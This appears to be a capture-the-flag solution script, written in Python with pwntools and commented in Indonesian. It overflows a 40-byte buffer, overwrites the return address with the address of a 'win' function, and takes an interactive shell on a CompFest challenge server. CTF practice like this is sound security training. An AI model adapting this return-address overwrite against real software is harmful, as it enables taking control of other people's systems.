from pwn import *

# Tentukan alamat dan port dari server remote
remote_address = 'challenges.ctf.compfest.id'
remote_port = 20006

# Alamat fungsi win
win_address = 0x00000000004011d6

# Buat payload dengan overflow buffer dan alamat fungsi win
payload = b'A' * 40 + p64(win_address)

# Buat koneksi ke server remote
io = remote(remote_address, remote_port)

# Kirim payload ke program
io.sendline(payload)

# Berinteraksi dengan shell untuk mendapatkan flag
io.interactive()
